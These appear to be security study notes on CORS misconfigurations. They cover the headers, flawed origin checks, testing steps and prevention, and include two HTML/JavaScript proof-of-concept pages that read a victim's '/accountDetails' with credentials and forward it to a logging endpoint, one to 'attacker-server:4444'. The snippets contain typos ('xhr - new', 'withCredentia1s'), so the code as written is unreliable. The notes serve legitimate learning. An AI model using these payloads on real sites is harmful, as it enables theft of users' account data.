#Cross-Origin_Resource_Sharing(CORS)
 

     ************************************************* Terminology *************************************************************************
        
        1. Origin 
           Origin is defined by the scheme (protocol), hostname (domain), and port of the URL used to access it.
      
        2. Same-Origin Policy (SOP)
           Same-Origin Policy (SOP) is a rule that is enforced by browsers to control access to data between web applications.
              • This does not prevent writing between web applications, it prevents reading between web applications.
              • Access is determined based on the origin.


     ************************************************* What is the Cross-Origin Resource Sharing (CORS) policy *****************************
        
        Cross-Origin Resource Sharing (CORS) is a mechanism that uses HTTP headers to define origins that the browser permit loading resources.
               
        CORS Headers
          • Access-Control-Allow-Origin (Allows only public pages )
            The Access-Control-Allow-Origin response header indicates whether the response can be shared with requesting code from the given origin.
            
            Syntax: 
              Access-Control-Allow-Origin: *
              Access-Control-Allow-Origin: <origin>
              Access-Control-Allow-Origin: null
      
          • Access-Control-Allow-Credentials
            The Access-control-Allow-credentials response header allows cookies (or other user credentials) to be included in cross-origin requests.
            
            Syntax: 
              Access-Control-Allow-Credentials: true
          
            Note: If the server is configured with the wildcard ("*") as the value of Access-Control-Allow-Origin header, then the use of credentials is not allowed.
          
 
     ************************************************* CORS Vulnerabilities ****************************************************************
          • CORS vulnerabilities arise from CORS configuration issues 
          • Arise from restrictions on available options to set the Access-Control-Allow-Origin header  
              Access-Control-Allow-Origin: *
              Access-Control-Allow-Origin: <origin>
              Access-Control-Allow-Origin: null
          • Forces developers to use dynamic generation  
          • CORS vulnerabilities arise from flaws in the way that dynamic generation is implemented:
              • Server_generated Access-Control-Allow-Origin header from client-specified Origin header
              • Errors parsing the Origin Headers
                  • Granting access to all domains that end in a specific string 
                     • Example: bank.com
                     • Bypass: maliciousbank.com
                  • Granting access to all domains that begin with a specific string
                     • Bypass: bank.com.malicious.com
              • Whitelisted null origin value
      
      
     ************************************************* Impact of CORS Vulnerabilities ******************************************************
      
          • Depends on the application that is being exploited
              • Confidentiality— it can be None / Partial (Low) / High
              • Integrity — usually either Partial or High
              • Availability —can be None / Partial (Low) / High
          • Remote code execution on the server
      
      
     ************************************************* How to find the CORS Vulnerabilities ************************************************
          
          Depends on the perspective of testing 
      
            1. Black-Box Testing 
               • Map the application
               • Test the application for dynamic generation
                  • Does it reflect the user-supplied ACAO header?
                  • Does it only validate on the start/end Of a specific string?
                  • Does it allow the null origin?
                  • Does it restrict the protocol?
                  • Does it allow credentials?
               • Once you have determined that a CORS vulnerability exists, review the application's functionality to determine how you can prove impact.
      
            2. White-Box Testing
               • Identify the framework/technologies that is being used by the application
               • Find out how this specific technology allows for CORS configuration
               • Review code to identify any misconfigurations in CORS rules


     ************************************************* How to exploit CORS Vulnerability ***************************************************
          
           • If the application allows for credentials:
                 • Server generated user supplied origin
                 • Validates on the start/end Of a specific string
                 
                 <HTML:Script for exploiting CORS Vulnerability>
                     < html>
                         <body>
                            <h1>Hello World!</h1>
                            <script>
                            var xhr - new XMLHttpRequest();
                            var url = "http://vulnerable-site.com"
                            xhr.onreadystatechange = function() {
                                if (xhr.readyState == XMLHttpRequest.DONE) {
                                    fetch("/log?key=" + xhr.responseText)
                                }
                            }
                            xhr.open( 'GET', url + "/accountDetails", true);
                            xhr.withCredentia1s = true;
                            xhr.send(null);
                            </script>
                         <body>
                     </html>
              
                 • Accepts the null origin 
      
                   <HTML:Script for exploiting CORS Vulnerability>
                       <html>
                           <body>
                              <h1>Hello World!</h1>
                              <iframe style ="display: none;" sandbox ="allow-scripts" srcdoc=" 
                              <script>
                              var xhr - new XMLHttpRequest();
                              var url = "http://vulnerable-site.com"
                              xhr.onreadystatechange = function() {
                                  if (xhr.readyState == XMLHttpRequest.DONE) {
                                      fetch('http://attacker-server:4444/log?key=' + xhr.responseText)
                                  }
                              }
                              xhr.open( 'GET', url + "/accountDetails", true);
                              xhr.withCredentia1s = true;
                              xhr.send(null);
                              </script>"></iframe>
                           <body>
                       </html>
      
              • If the application does not allow for credentials
                 • What security impact does that have on the application?
              
      
     ************************************************* How to prevent CORS Vulnerabilities *************************************************
            
            • Proper configuration of cross-origin requests
            • Only allow trusted sites
            • Avoid whitelisting null
            • Avoid wildcards in internal networks
      
              
     ************************************************* Resources ***************************************************************************
      
          • JetBrains IDE Remote Code Execution and Local File Disclosure 
            http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/ 
          
          • Exploiting CORS misconfigurations for Bitcoins and bounties 
            https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties 
          
          • StackStorm - From Originull to RCE - CVE-2019-9580
            https://quitten.github.io/StackStorm/ 
          
          • Web Security Academy - Cross-origin resource sharing (CORS)
            https://portswigger.net/web-security/cors 
          
          • Web Application Hacker's Handbook
            Chapter 13 — Attacking Users: Other Techniques (pages 524 — 531)
          
          • AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle
            https://www.youtube.com/watch?v=wgkj4Zgxl4c&ab_channel=OWASPFoundation 
          
          • Advanced CORS Exploitation Techniques
            https://www.corben.io/advanced-cors-techniques/